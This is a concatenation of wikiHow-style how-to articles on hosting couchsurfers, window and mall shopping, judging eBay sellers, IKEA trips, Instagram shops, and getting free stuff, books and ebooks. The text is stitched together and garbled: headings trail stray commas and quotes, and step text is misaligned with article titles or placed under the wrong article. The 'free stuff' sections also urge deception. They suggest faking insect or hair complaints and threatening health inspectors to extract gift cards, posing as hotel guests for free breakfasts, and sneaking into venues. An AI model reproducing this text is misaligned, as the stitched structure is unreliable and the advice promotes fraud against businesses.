Help your couchsurfers coordinate how they are getting there, how long they will be staying, and when it is best to arrive so that you will be around to show them in.
Give your location and directions when you are confident that you will be hosting a particular couchsurfer. (Many couchsurfers will make several requests for a particular area, in case not all choices are available.)
Exchange phone numbers. A call or text can set things straight if someone's lost or running late.
Give any special instructions, for example if you need them to call from outside a gate, enter through a side door, or avoid letting out an animal.

, The Couchsurfing website will also send a reminder a day or two before the person arrives.

, Be home (or at your agreed upon meeting point) when you say you will. Your couchsurfer is probably traveling, so try to make their trip easier, not harder. Try to be patient and keep in touch, however, if they don't arrive right on time. Rides get stuck in traffic. Flights get delayed.

, Point out where they will be sleeping, along with which bathroom they should use. Offer a shower, towel, and any pillows, sheets, or blankets you want them to use. Remember that your couchsurfer may be tired from traveling or from jet lag.

, It's not required, but it's a great way to get to know both your guest and your own area.


You may be the best resource your couchsurfer has for understanding area transportation, recommending good nearby restaurants, or identifying the best (and worst) places to visit while they're in town.
Tell your couchsurfer about the culture in your area, especially if they are from far away.
Go with your couchsurfer on tour visits, if you both are interested. Take the opportunity to play tour guide, or to see the sights in your own area if you haven't lately.

Decide what types of stores you want to browse.,
Research area shops.,
Pick a place with multiple shops.,
Check the weather.",How to Go Window Shopping1," You may have certain goals for your window shopping, like getting inspiration to decorate your living room or getting ideas for what you want in your spring wardrobe. If you have a goal like this, make sure you choose a place to window shop that will have a plethora of the kind of stores you’re looking for.Ask yourself: What are my goals for window shopping? Am I looking to get inspiration for anything in particular? What kinds of merchandise do I want to see while I am shopping?;
, You may need to research shopping areas to find out what types of stores they contain and whether or not these stores will meet your needs. A quick Internet search of surrounding shopping centers will allow you to view a list of the stores each one contains, and help you make your decision on where to go.

, When planning an afternoon of window shopping, it is important to pick a spot with a variety of stores. This will make it easy for you to stroll from store to store, without having to commute to a different spot to continue window shopping.


Some good places to window shop include shopping malls, urban areas with stores along the streets, and flea markets.The goals you’ve thought about in the first step will also play a role in where you decide to window shop. For example, if you’re looking to get inspiration to decorate your living room, make sure you pick an area that has quite a few furniture or home goods stores. This will meet both your goals for window shopping, as well as allow you to complete your window shopping in one area.

, Also take the weather into consideration when you are planning a window shopping trip. Dealing with rain, extreme wind, or cold can make for an unpleasant day. If it is supposed to be nice on the day of your trip, feel free to choose an outside location. If the weather is going to be unpleasant, however, going to an indoor shopping center is probably best.

Set your house rules.,
Enforce the rules you have put in place.,
Hide any valuables and personal mementos.,
Talk with guests about their behavior.,
Ask them to leave.",How to Deal with a Bad Couchsurfing Guest," Before your guest arrives, make sure that you’ve created a set of house rules.


Most of the time, guests don’t intend to be rude or misbehave. They simply don’t know the rules, limitations, and culture that exists in the place they’re staying.
Make sure that you let your guest know the guidelines that are in place in your house. This will make it easier for them to comply and will go a long way toward avoiding any future misunderstandings.;
, After you’ve set the house rules, it is important that you follow through and enforce them. If you have any areas that you’ve declared to be off limits, make sure that they remain off limits.


Don’t be afraid to enforce your rules when guests are becoming too invasive.

, It is best to secret these offsite at a friend's or relative's place. You’ll never know if a guest has some unwanted habits until they show it, so make sure that you’re ready if and when the situation arises. Remember that you’re still sharing your home with a complete stranger and some guests may find it rather tempting to bring back “souvenirs.”

, If your guest is showing some behavior or conduct that makes you uncomfortable, speak up. Staying silent won’t help the situation, so make sure to talk to them in an honest and straight forward way about the those things which bother you.


Their actions probably seem normal to them, so they won’t know that there is a disconnect unless you tell them. Misunderstandings can be avoided by having simple talks early in the relationship.

, If you’ve tried every reasonable way to ease the situation, maybe it’s time to ask them to leave.


Some Couchsurfers have the impression that they can do whatever they want simply because they’re the guests. This is completely untrue. Both hosts and guests have responsibilities to behave civilly and respectfully when sharing a house.
Don’t be afraid to kick them out. After all, it’s still your house.

Dress comfortably.,
Take your time.,
Bring friends along.,
Take notes.,
Take breaks as needed.",How to Go Window Shopping2," You’ll likely be doing quite a bit of walking when you go window shopping, so make sure you dress comfortably. Wear shoes that won’t hurt your feet and clothes you can spend the better part of a day in. It is also a good idea to dress in layers so you are prepared for all kinds of weather.

, Window shopping is generally a laid-back, leisure activity. Leave yourself plenty of time to browse shops and make comparisons between merchandise and retailers. If possible, go window shopping on a day where you don’t have any commitments so that you can spend as much time as you want browsing window displays.Stop at each window display that catches your eye and study it. Think about what you like about it, what stands out most to you, and how you might incorporate this style into your wardrobe or décor.

, Inviting a few friends to go window shopping with you can make it even more enjoyable. Make sure you bring friends that want to look at the same kind of stores and intend only to window shop. If one of your friends plans to buy items while you’re window shopping, you could be setting yourself up for an unpleasant day.

, Depending on your window shopping goals, you might want to take some brief notes while you’re looking at window displays. Carry a small notepad and pen, or use a notes app on your phone to jot down ideas, prices, locations, and any other information you might be looking to gather that day. For example, take a picture of a living room set up you really like, or jot down how much a TV stand you love costs so you can compare it to similar items you find.


Be careful you don’t let note-taking take over your window shopping experience. Window shopping is meant to be a leisure activity so if you make it too much about gathering information it might not be as fun anymore., Window shopping is all about relaxing, so allow yourself to take breaks throughout the day. For example, meet a friend for coffee or lunch, or just sit down on a bench and people watch for a while. Staying relaxed will make your window shopping experience all the more enjoyable!

"
Set aside a block of time.,
Compare items using tabs on your computer.,
Bookmark your favorites.",How to Go Window Shopping3," Most people think of a brick and mortar location when they think of window shopping. Browsing websites online is, in effect, the same thing as window shopping. It may actually be more convenient, especially if you have mobility issues or little time to get out of the house. To go window shopping online, set aside a block of time that you can do this without being rushed. For example, take a couple hours to do so after you’ve put the kids to bed or during their nap time., Online window shopping is a great way to compare items and prices side by side. If you are looking for one particular item, find the item on a few different sites, pulling each site up in a separate tab on your computer. You can then flip back and forth between the tabs to compare statistics on each site., The bookmarks feature on web browsers makes it especially easy to save your favorite items or sites. When you find a product you like at a great price, bookmark this site so you can easily find it the next time you log on. You can also use this feature to save sites that provided inspiration, good information about a particular item, or advertise upcoming sales. You’ll use this feature much like you’d use a note pad or notes app while window shopping brick and mortar stores."

Make up your mind not to buy.,
Leave your wallet in the car or at home.,
Figure out when you’re more likely to buy.",How to Go Window Shopping4," For some, impulse buying is a big threat when window shopping. If you truly just want to window shop and not purchase anything, make that decision ahead of time and stick to it.If you don’t think you’ll be able to resist the temptation to buy, try one of these strategies:


Stick to looking at only the window displays if you think you’ll be tempted to buy—don’t go inside any stores.
If you’re window shopping with a friend, let them know that you’re trying to just go window shopping, and do not want to buy anything. They can remind you of this if you try to purchase an item.

, If you’re afraid you won’t be able to keep yourself to just window shopping, leave your wallet or purse in the car or at home. Doing so will ensure you don’t have any means to purchase something in the store. You may, however, want to bring a small amount of cash along to grab coffee or lunch.


If you’re an online window shopper, don’t save any of your credit card information on retailers’ websites. This will make it more difficult for your to make a purchase and help you stick to just window shopping., Most people have triggers that cause them to want to shop or to make impulse buys when they are shopping. Think about what emotions make you want to shop. For example, do you purchase more when you are feeling sad? Or excited? Once you identify these triggers, avoid window shopping when you are feeling this way because you’ll be more at risk to purchasing items impulsively."
"
Identify your shopping style.,
Consider your motivations for shopping.,
Research products before you go to the mall.,
Dress comfortably.,
Go to the mall during off-hours.,
Shop for clothes on Thursday evenings.,
Look for deals in the back of the store.,
Compare prices at different stores.,
Try on clothing before you buy it.,
Think about an item, walk around, and come back.,
Dine out.,
Catch a movie.,
Enjoy events for the whole family.",How to Go Shopping at the Mall," What kind of shopper are you? Are you someone who dashes in, gets the one thing they need, and then sprints back to the parking lot? Or are you someone who likes to take their time meandering from one end of the mall to the other, window shopping and people watching, with no particular goal in mind? Both kinds of shoppers can thrive at the mall, but it's best to define a game plan before you go.Similarly, it's worth it to decide if you are a social shopper, or a lone warrior. While shopping with friends can be fun, you might not be able to go to the exact store at the exact moment you want to. Will that frustrate you? If so, it's best to go on your own.;
, Are you shopping for a particular item that you need or is it a luxury that you want? Are you getting a gift for a friend, or are you simply looking for a small trinket to lift your mood? While a little bit of retail therapy is fine, make sure that your shopping habits are practiced in moderation.


Set a clear budget before you shop. Do not try on items or touch items that are over that budget. If you see an item that is clearly over your budget, do not linger by it.Keep your impulses in check. Maybe you need a new pair of shoes. But if you emerge from the store with seven new pairs, this might be an indication that you have a shopping addiction.If you go on weekly shopping sprees, find yourself in massive debt from your shopping, or often try to hide your purchases from your loved ones, then this might be a sign that you have a shopping addiction. Seek help from a psychiatrist who specializes in addiction., If you need a specific item (like a frying pan), but it could be found in multiple stores in the mall, then research which stores carry it (like a department store such as Macy's or a specialty store like Williams-Sonoma.). You don't want to get to the mall and then find there are no stores that carry the item you need.


You can generally find a directory of stores on the web site for the mall.
Don't assume that just because a store was in the mall five years ago that it will still be there today. Many indoor malls, especially, have lost revenue over the past ten years and have had trouble retaining small stores (and sometimes even the larger department stores which anchor them)., It's natural to want to look cute at the mall -- after all, how many awkward first dates have occurred in Cheesecake Factories across the country? -- but make sure you are comfortable. Malls are large spaces that require a lot of walking, so this might not be the best time for very tall heels.


If you are shopping for clothes, be sure to wear pieces that are easy to change out of and back into. Wear pants or shorts (as opposed to leggings and skirts) and a simple top layer, like a sweater or T-shirt you can easily pull over your head. Wear shoes that are easy to slip on and off (so no tall boots with lots of laces).

, The busiest times at the mall are on the weekends, particularly in the afternoon. If you prefer to shop at a less hectic time, try to go early in the morning or in the evenings on weekdays.Keep in mind that on some days -- like the weekends between Thanksgiving and Christmas (especially Black Friday) -- malls will often be very hectic. If you are planning to shop during this time period, check the store's website to see if the item you want is available in the physical store. If it's not available at that particular store, this will save you time and disappointment.

, Most major clothing retailers (in malls and elsewhere) rearrange their racks on Thursday evenings to prepare for the weekend crowds. If you go on Thursday, you will be able to see the newest full-price merchandise, as well as the latest additions to the sales racks.You should also look for clothes 6-8 weeks into a season. For instance, many stores will put out fall clothes in August or September. If you can wait until October-November to stock up on some new sweaters, then you are more likely to get a good deal., In most stores, the very nice, full-priced items are right up front, just waiting to lure you into pulling out your wallet. But if you really want the best deals, then head to the back of the store, because this where the discounted and clearance items usually live., Before you put down some money for a must have item, step back and compare prices at a different store for the same item. Look for the lowest price for the item by walking to another store or several other stores in the mall.


You may also want to compare prices for an item online before you go to the mall so you have a good sense of what you should be paying for the item. You may also come across a special deal advertised online that you can take advantage of in stores.
Apps like RedLaser and ShopSavvy will help you to comparison price on-line, especially if an item at one department store is being sold for a better price at another retailer.If the on-line version of the brick and mortar store is offering a sale, check the price of their shipping fees. Sometimes the price of the shipping might not really make the item much more affordable on-line than if you buy it now in the store.

, Rather than make a spontaneous purchase and buy a clothing item without trying it on, head to the change room. Put on the item and really consider how it fits your body type and if it flatters you. Ask a friend or a sales person for a second opinion to determine if the item fits you well and is worth the price.


You may also want to take advantage of three way mirrors in the center of the change room and look at the item from several angles. If it appears flattering from every angle, it may be worth buying.

, Make your money count at the mall by avoiding quick purchases. Instead, put an item back on the shelf or rack, go for a walk around the mall and think about whether you really want or need the item. Consider how the item will fit into your closet and if it is what you were looking for. Once you've reached a decision, you can walk back into the store and make the purchase with confidence.

, When most people think of the food court at the mall, the word ""local"" might not spring to mind. But some upscale malls have sought out local chefs and restaurateurs to attract customers in addition to offering the traditional standbys like S'barro, Pizza Hut and California Pizza Kitchen..


If you know you will need to spend a long afternoon at the mall, it might be best to budget a break at the food court or time to get a drink at a Starbucks. If you are shopping with children, this is especially important.

, Some malls have movie theaters built into them. If you have some errands to run, you can schedule these around the showtime of the movie you wish to see.


Watching a movie can be a great way to relax after a busy day of shopping.

, Some malls, like the Mall of America in Bloomington, Minnesota, are not just shopping destinations -- they also offer amusement park rides and water slides for the whole family to enjoy.Even if your mall doesn't have an indoor amusement park, it might have attractions like a carousel, an arcade with games, or a restaurant with a play pen for kids. Scheduling time to enjoy these can help prevent meltdowns from tired children.

Get plenty of money.,
Wear the right clothes.,
Call up your friends.,
Before you go, think about if there's anything you really need such as you really need jeans or some sundresses.,
Also before you go, think of the must-go-to stores.,
Try new stores.",How to Go Shopping," You might want to set a budget for yourself. Ask your parents to give you money...like $200. Your parents probably won't agree at first, but tell them that's how much they normally spend when they take you shopping, and that that will be your absolute max, you'll be careful on what you buy, and you'll return the extra money. Even say you'll do extra chores and stuff to earn it back. If they don't give you all of it (e.c.t birthday money, pocket money or Christmas money), ask your grandparents, then get the rest yourself. Save up for shopping money.;
, Don't wear tight skinny jeans- wear something that slips off quickly and easily. Don't wear sneakers or other shoes that tie and are complicated, instead wear flip flops, flats, or maybe heels if they don't make your feet hurt. You could also wear loafers or something that can slip off quick and easy! Wear your best bra, and you might want to wear a strapless one or one that can go strapless, because you might try on a strapless shirt. And you also might want to wear a tank-top or cami underneath your shirt because you might try on a shirt you'd wear one with.

, Get a group of about 2-4 friends to go with. If one of you can drive, you could tell them to pick you each up. If you're like 12-15 have your parents drop you off, and agree to all meet at a certain time at a certain place (eg 2:00 outside of Dillard's).You don't have to go with friends, but it can be more fun and less boring if you bring friends.

, You may want to write a list or write it on the Memo Pad in your phone.

, Depending on where you're shopping though will depend on whether or not these stores are there. For example if you're going to a bunch of outlets they most likely won't have as much of these stores, whereas a mall will. Know what good stores- including you and your friends' favorites- are where you'll be shopping.

, If you're walking and see a store that looks good, go in it. There's tons of stores you've probably never heard of at outlets, and most of them are good.

Check the item title.,
Review pictures closely.,
Read the descriptions.,
Check reviews.,
Ignore the stereotypes.",How to Identify Good Sellers and Authentic Items on eBay," It is advised not to buy an item that has a title with exaggerated symbols (using a lot of @ $ % &) or letters (such as all capital letters). This misuse of title characters is often associated with poor product quality; if it's a brand item, It must be a fake for sure!


Review the seller's store closely, if so. Some sellers indicate they are US seller on the listing title, but they may be deceptive. Their items may not be good quality or may be fake, but just pretend to be a US seller since they are living in US or they are using oversea warehouse to deliver their items to US buyers. Most real US sellers don't list item titles int his way.;
, Don't buy something with poor pictures. Can you imagine selling premium items but using poor pictures to show how fabulous your items are? Most good sellers take the time to present good images of their products.


In addition, you shouldn't don't trust sellers who make up pictures excessively or add too many ornaments in pictures. Sellers who list simple and clear pictures that show the qualities of their items are best.

, It may be the most important part to decide to buy an item or not. Many sellers neglect aesthetics of the font and item page - they produce listings that are cluttered and messy, with ugly fonts. How can you persuade someone or prove you are selling high grade or authentic items?


Every trusted seller has a fabulous and great pages on eBay or their own sites. As a buyer, you should trust those whose online stores seem to be professional. When shopping at some small stores on eBay or other sites (many small and not famous but quality sellers), choose wisely, and only choose those with a neat page, appropriate font size and clear, and concise but clear descriptions.

, eBay provides seller reviews for a reason - reading over the reviews that previous buyers have left for a seller is a good way to get an indication of which businesses you want to purchase from. Beware of false reviews, but examine both the star ratings and what previous buyers have to say, and look for any outliers that indicate either a wonderful or terrible buying experience.

, Some buyers are inclined to avoid overseas sellers; however, they can often provide items for cheaper than local sellers, and they can still be reliable. For example, not all sellers from China only sell poor, cheap and fake products. With some hunting, you can buy good quality, creative and originally designed products from them.

Don't forget to pay for your items, or you could be getting a ticket to jail.

,
Now you have finished shopping, consider your travelling.",How to Get to the Shops," For example, if its snowing, you might need woollies, or if it's a thunderstorm, you might consider staying indoors.;
, What do you need to buy? Do you need a list? You must consider the option, and maybe go to the Cash Point machine to collect some money. We'll cover that later.

, That's a common mistake. You don't want to get locked out now, do you? Didn't think so.

, Do you have a car? And if so, is it worth wasting the petrol, if the Shop is only a few minutes away? But if the Shop is over an hour away, is it worth walking? Want to catch a bus? Check the times on the website, and if you are, make sure to leave about as long as it takes to get from your house to the bus stop, plus one minute. If catching a taxi, order one, and wait for its arrival.

,, The cashpoint machine! Is there one on the way to the Shops? If so, and you need money, stop by, and insert your Cashpoint Card, enter your PIN, enter the desired amount of money and wait for it to come out.

, If its only a few tins, or a packet of sweets, then just carry them. If it's a multipack of crisps, or something big, perhaps you should consider a basket, and if you need that months shopping, be sure to get a trolley.

,, Have you done the monthly Shop? If you don't have a car, order a taxi! If you bought a small amount of things, just take the same way of travelling as before.

Think about what you need to get.,
Create a mental or physical list of items you wish to buy.,
Locate your local Ikea and begin your trip there.,
Arrive at the store and arm yourself with two complimentary pencils, a measuring tape and a purchase form.,
Make a draft trip.,
Make the final trip.,
Take a break (optional).,
Check your wish list and make sure you have gotten everything that you came to Ikea to buy.,
Head to the checkout area and purchase your items.,
Opt to having your items delivered for a fee or pack the items into your car.,
Arrive at home and nestle your new purchase in the ideal place.",How to Get the Most Out of Your Trip to Ikea," Identify what needs improvement, then brainstorm to target potential additions. Proceed room-by-room and visualize (with your partner or friend) a new face that will pleasantly greet you as you enter, one that will provide happiness and a spark of delight.;
, Think of this as a homeware exclusive Christmas list, however, in this list you should include all measurements; this significantly reduces the chance of your well picked out future purchase looking odd in your home or worse, not fitting at all.

, Ikea stores can be easily located using your national Ikea website and using the store locator.


If you're travelling by car, be sure to clear out as much space in your vehicle to minimize the chance of a second trip.







, Noting down product numbers, sizes and prices of potential purchases will make price comparison and finding your product easier. Be sure to compare measurements with the wish list your created prior to arriving at the store.

, This is your warm up; prep your mind and switch on your home ware thinking cap. Visually skim through your areas of interest and note down items which catch your eye and familiarize yourself with the layout. Once you find yourself at the exit/entrance, prepare for round two.

, At this point, you'll have a rough idea of what items you'll buy and where you need to go to find them. If you wish to buy larger items (or several smaller items) get a shopping cart. Alternatively, if you only need to pick up a few smaller items then just pick up a yellow shopping bag.


Head to your areas of interest and weigh up the pros and cons of each individual purchase. Bear in mind the importance of pre-existing furniture and accessories that will have an impact on how your new product will look in your home.

, When you reach the mid-point of your final trip, you may realize that you have stirred up quite an appetite, if this is the case, it would be brilliant timing to make use of the in-store restaurant which offers unlimited re-fills on drinks, free Wi-Fi and is notoriously cheap.


Shopping on an empty stomach is ill-advised. So, when the debate with your partner about table leg styles is becoming increasingly fierce, take time to sit down and discuss the matter over a beverage of your choice, a coffee, for instance.

, In the event that you did not find what you came to buy, use the what you saw during your visit as a guide and inspiration in the quest for your ideal product.

, Double check the items in your shopping cart/bag to ensure that the product numbers, colours and measurements are all correct.

, For smaller purchases, you can simply take a taxi, train or bus back.

, Build your purchase with the provided instructions and remember to clean any kitchen ware prior to storing it.

Most of the items being sold on Instagram fall into the Beauty and Fashion categories. These kinds of items are likely to be most successful, as long as you are offering something unique.;
, Find a successful online store on Instagram, and note how it runs and what makes it work so well. Don’t copy its style or use its exact ideas, but let it serve as your inspirational example.

, Choose a username that’s unique and memorable, but nothing too long or difficult to understand. Make it easy to spell, and avoid using too many numbers. You want your potential customers to find you easily.

, Add your store’s logo to your new Instagram account, and then set it as your profile picture.


If you don’t have a logo and can’t make your own, contact a graphic artist. You want someone knowledgeable and creative enough to make you a memorable and professional-looking logo.

, Write a brief, polished, professional-looking description of your shop, with information about the items or services you are offering, and post it to your profile. And be sure to include your contact information! Instagram does not provide direct messaging, so you’ll need to make your phone number or email address available.


You can also download a messaging application, which will allow you to send and receive messages associated with your Instagram account. This might help, but you should still have alternative contact information available.

, Upload high-quality pictures of your items one at a time (not as a set), so potential buyers can comment on the photo of a particular product. In addition, upload important information like your payment methods and shipping partners. Your online Instagram shop is now open and running!

,, The hashtag is #inselly. All those pictures will automatically appear in your inSelly account, thus creating your own personal online shop.

, Add PayPal email to receive direct payments from buyers.

,, When posting new sales offers comment ""To buy click the link in bio"" to allow your Instagram followers to buy items in just one click.

, This will allow them to buy your items.

, Every follower is a potential customer. Do some research online to figure out how to get as many followers as possible. For starters, try:


Connecting your Instagram to your Facebook, Twitter, and/or Tumblr accounts. Use all of your available social media accounts to promote your shop.
Following random people, especially those you think may be potential buyers.
Being friendly and acknowledging all inquiries.

, Make sure your pictures are of the highest quality possible.

, Online sellers often use hashtags like #forsale or #sale. In addition, you can use hashtags that describe the categories of your items. For example, if you are selling lipstick, you can use #beauty, #makeup, and/or #lipstick. Adding hashtags will earn your pictures more “likes.”

, Do not neglect your shop. Update photos every day, and don’t hesitate to re-upload items.

, You can send an item to local celebrities or bloggers in exchange for these people posting and promoting your products on their feeds. You may reach many new buyers this way.


The best way to approach this is to leave a comment with your contact details on someone’s Instagram photo. Ask if you can send them an item.
You are most likely to be successful at this technique if you look for celebrities and other people who typically post gifts from Instagram Shops.

, Ask politely for photo feedback when your buyers receive their items. Upload any feedback, cultivating positive impressions about your business.

Sign up for mailing lists to get free promotions.,
Take online surveys.,
Keep an eye out for coupons.,
Complain about a product.,
Just ask.",How to Get Free Stuff1," If you want to receive free samples of new products from your favorite companies or retailers, the best way to make sure you never miss out is to sign up for their mailing lists. It's tough to keep track of all the different products available without helpful reminders, which is why online mailing lists help to keep you up to date on the newest offerings and deals that companies offer to try to hook consumers.


Generally, you might get a free coupon, or a code that will allow you to to redeem for a free sample of the new product. You might have to jump through a few hoops, but there'll be free stuff at the end of it.;
, Increasingly, online start-ups and other companies know the value of consumer data, and are willing to pay for it with prizes and cash compensation. One cool new way to get free stuff is to take online surveys that will take up a bit of your time, pick your brain, and give you some free stuff at the end, usually in the form of a gift card or other free company merchandise.

, Looking for buy one-get one coupons or totally free coupons in the weekly mailers at grocery stores, retail stores, and other places is a great way to nab free swag. Clip free coupons and keep them in separate envelopes, marked by expiration date to make sure you can redeem as much free stuff as possible. This is a common way of marketing new products to consumers. Might as well take advantage!

, While it might take some acting, one of the oldest ways of getting stuff for free is to straight-up complain to someone in charge. Most of the time, rather than trying to reason with grumpy customers or offer refunds, it's in the best interest of most retail managers to just offer some free stuff and hope the problems goes away. If you're wiling to complain to perfect strangers, you stand a good chance of getting something for free.


If you're at a store, ask to see the manager and come up with a good reason that your product was unacceptable and perhaps dangerous. ""I didn't like it"" or ""It didn't fit"" isn't a good enough reason. If it's food, it's always best to go the insect or hair route. Bring up the possibility of calling the health inspector. You'll have so many gift cards you'll need another wallet.
If you get a product you're genuinely dissatisfied with when you get home, call the customer service number for the corporation or call the store directly and ask to speak with the manager. Explain your problem with the product, and most of the time you'll be offered recompense without having to ask.

, If you're at the store and want a sample of food, perfume, or some other type of product, most retailers are more than happy to offer them, especially if you're already interested in buying. Find a salesperson and let them know that you're interested in a particularly product, and ask if you could try a sample. Most good stores will offer samples outright, but you can always ask.


Remember, just because you've gotten a sample puts you under no obligation to make a purchase. You might be considered an annoying customer, but it's your money.

Get free coffee at the bank.,
Hit up the continental breakfast with the ""other"" guests.,
Hit up the farmers' market just before closing time.,
Head to a street festival for samples.,
Get free tastes.,
Check the trash behind grocery outlets.,
Learn to recognize edible plants and other foragable food.",How to Get Free Stuff2," Free food and drink is available sometimes in the most unlikely places. Most big banks offer free coffee in the lobby, which you can load up on quickly and high-tail it out of there. If someone asks if you need help, say that you've got a check from a different bank that you need to deposit and you want to know if you can deposit it here. When the employee asks if you're a member, say no. No transaction required.


You can also get free coffee at Starbucks, Dunkin Donuts, and Caribou Coffee by enrolling in their rewards program, which is free. Sign up, print the coupon, and redeem it at the store for some coffee on the house.

, Time to polish off your acting skills again. Find a good hotel chain in your area and locate the continental breakfast room for a free pastry, piece of fruit, and maybe even a waffle if you're lucky. While some hotels keep the breakfast locked away in a room you've got to access with a key card, most of them have the breakfast out in the open, making it easily available to anyone who looks the part.


Don't worry too much about getting caught. Because most guests don't stay longer than a day, and because the front desk employee turns over each morning, it's unlikely you'll be caught. While it's not illegal, it's better to just leave quietly if someone catches you and threatens the cops. There's a difference between ""against the law"" and ""against corporate rules."" Still, don't make a scene.

, One of the biggest secrets about farmers' markets is that most of the vendors are itching to get rid of everything before they have to pack back up and head home. Do a quick sweep through the market to see what looks good, then wait to approach any of the booths until 10 or 15 minutes before the end of the day. The less produce the vendors have to lug back, the better. Ask about two for one deals or whether or not they've got any overripe stuff to get rid of.

, Street fairs and other festivals will commonly offer free samples to try to hook passers-by, and these locations are also great places to nab a free energy drink, energy bar, or other new products, which will often send employees to give out free stuff to try to drum up interest in the products. Look for people carrying backpacks full of Red Bull, Yoo-hoo, or Luna Bars.

, Wine, beer, chocolate, fresh produce, and lots of other types of high-end goods are commonly given out as samples for no cost at retail locations. The presumption is that you’ll love it so much you’ll buy something for a hefty price tag, but there’s no contract involved, and no shame. Try everything and tell them you'll think about it.

, If you're willing to get dirty, head to the alley behind a grocery store and find the dumpster. Legally, restaurants, grocery stores, and other food outlets are required to throw out a crazy amount of perfectly-edible food. It requires some digging (literally), but finding ""out of date"" canned goods and partially-bruised produce can be a great way of nabbing free food. Avoid meat and dairy.


In some places, this technically counts as trespassing, if you're wandering into or onto the property of the business. Be discreet and be careful.

, If you're a fan of nature walks and free produce, learning to recognize edible plants in your area can be a great way of getting outside and enjoying the wider world, as well as finding free food. Greens, berries, and nuts are available if you know where to look. Invest in a good field guide in your area and learn to recognize the local edibles. Wash things thoroughly, make sure you're not wandering onto private property, and you'll be in good shape.


Euell Gibbons, a survivalist and writer, lived primarily off of foraged food for the majority of his life, and not just in places like Hawaii. He foraged extensively in Pennsylvania, Indiana, and Ohio, finding plenty of unexpected food to sustain him. Wherever you live, there's food to be had.

Use free Wi-Fi connections.,
Pick up free newspapers.,
Go to the library.,
Download free music.,
Watch TV in public.,
Wait until closing time at venues.",How to Get Free Stuff3," If you're paying for the Internet, but aren't necessarily a heavy user, there's probably an easier way to watch YouTube and check your email. Most coffee shops and an increasing number of other retail locations offer free Wi-Fi to customers, and some towns are even undertaking free public Wi-Fi projects. Likewise, most libraries have free Internet connections that you can use. Stop draining your paycheck with Internet subscriptions you could get elsewhere for free.

, If you're paying for the paper, stop. Getting access to the newspaper for free, or getting some variety of reading material doesn't require turning over your hard-earned money.


College campuses regularly make newspapers available in the entryways of certain buildings. They're supposed to be for students, but public campuses are easy to walk around. Get the New York Times for free, or the campus paper.
Free weeklies that focus primarily on arts and entertainment, or other niche markets, are available in most larger towns. Pick them up for free on the street, or in coffee shops, record stores, and other venues.

, The best place for free entertainment has to be the public library. From Wi-Fi to the daily newspaper, you can get almost anything you want for free at the library. Check out the latest DVDs without having to pay for them, read the current issues of your favorite magazines, newspapers, and books, and check out free CDs and upload them to your computer so you can keep them on your iPod. Free stuff, as long as you return it on time.

, Downloading music for free doesn't have to be illegal, or throw you into the deep water of the shady parts of the internet. Learning to find free legal downloads is a great way of learning about new groups and hearing new stuff on the cheap.


Check out Bandcamp and Soundcloud for free singles, free downloads, and whole albums available for pay what you want plans. Enter zero and download albums for free.
If you're a regular user of YouTube when you want to hear a song, you can download the audio files from YouTube videos quickly with a freeware client like YouTube to MP3 or other free programs that isolate the audio and download it to your computer.

, Got a big cable bill every month? Cancel it. Head to coffee shops or bars to watch the big game, or other places where the TV is on all the time. Watch TV while you're doing other things in public and you won't have to worry about paying for it at home. If you have access to the internet, watch your favorite programs on Hulu or other online venues for free instead of paying for 300 channels with nothing on.

, Getting in to a show for free? Why not! While it’s not the most reliable way of getting into an event (at least compared to actually buying a ticket), lots of places like zoos, museums, festivals and concerts will become a bit lazier about guarding the door in the last 20 or 30 minutes before the show's over. Some places, if you ask about tickets, might even just let you go in. Can't hurt to ask.


If you hear about an outdoor concert, don't bother with a ticket. Bring some lawn chairs and set up right on the other side of the fence. Free tunes on a nice night? Who cares if you can't see the stage.

Dumpster dive at charity shops.,
Find public bookcases.,
Keep an eye out for book giveaways.,
Get the most out of your library.,
Volunteer in exchange for books.",How to Get Free Books1," There are several well-known sites dedicated to trading books. Here are a few options:


Join a books-by-mail site such as BookMooch, WhatsOnMyBookshelf, or PaperBackSwap. You mail out books to other users, earning points to request books for yourself.
Sign up for BookCrossing to join a worldwide community of readers passing on books from hand to hand.
To avoid long-distance postage, search online for country-specific sites, such as BookSwapAustralia or the UK's Read It Swap It.;
, These aren't limited to books, but that doesn't mean you can't find readable treasures. A few options include:



Joining a local Freecycle to find free things in your neighborhood.
TitleTrader for books, films, and music.
The free section of sites such as craiglist, Yerdle, or freelywheely. Be cautious and meet strangers in public during the day., If you have extra books, invite friends and family over to trade for them. It's best to trade all books one-for-one, regardless of value. This keeps things friendly and focused on good books, not good deals.

, Charity shops and thrift shops often have giveaway bins of stuff they can't sell. If you're lucky, you might live near a ""shop"" that gives books away, such as Book-Cycle in the UK., The Little Free Library project has been spreading miniature book-filled houses across many lawns and sidewalks. Many of these are registered on the project's online map. Cafés, libraries, and college campus buildings have been using this ""public bookcase"" idea for much longer, but most of these can only be discovered by word of mouth.


If none of your bookworm friends have discovered these, try finding an online forum for your neighborhood and asking about them there.
Starting your own is a great way to collect books and meet other readers in your area. If you live in an apartment building, ask your landlord if you can put a bookcase in the lobby.

, Authors sometimes give away their books as a promotion, or in trade for a public review. You can find these most easily on large book community sites such as Library Thing and Young Adult and Kids Books Central.


The #amazongiveaway Twitter hashtag usually has several book or ebook giveaways going on. View it ""Live"" instead of ""Top"" to see all recent results.
Small blogs host these contests as well, but it's not worth tracking them down unless you follow the blog already. Look through book blogger directories online if you're interested in hearing from authors, reviewers, and other people in the book world.

, If you think you've exhausted your local library's supply, talk to a librarian. Most libraries let you order books from other branches, or borrow online content using your library card.


You can request a specific book from the head librarian or a Friend of the Library organization. Depending on budget, the staff may be willing to purchase that book for the collection, and let you know when it arrives., If you know someone with a full attic or garage, offer to organize it in exchange for books you find in the process. Bookstores and libraries may also be willing to give you overstock for a few hours of shelving.

For example, Project Gutenberg Australia includes some works which are still copyrighted in the U.S., Almost all ebook stores have a free section, including the Amazon Kindle Store, Kobo, Nook Books, and Google Play Books. Less well-known options include Smashwords, a popular indie publishing site, and Feedbooks, an ebook store aimed at mobile devices.

Get public domain books from Project Gutenberg.,
Use Free Book Search to expand your collection.,
Check the Internet Text Archive.,
Check out books from your library.",How to Find Free eBooks1," Project Gutenberg is a non-profit organization that provides free downloads of books whose copyrights have expired. It is the first and oldest eBook repository on the Internet, and contains thousands of classic books in nearly every genre. Simply visit the website and use the search bar in the upper left to browse by title or author.









Project Gutenberg provides eBooks in many different formats, ranging from HTML and plain text to EPUB and Kindle reader formats. All available versions of the book you choose are clearly displayed on its page.
You can also browse through the site library, or browse books by category. The links for these options are below the search bar.
Chances are, if you've heard of a book published before the 1920s, it's available for free at Project Gutenberg. Mark Twain, Jane Austen, and Franz Kafka are among the authors richly represented there.;
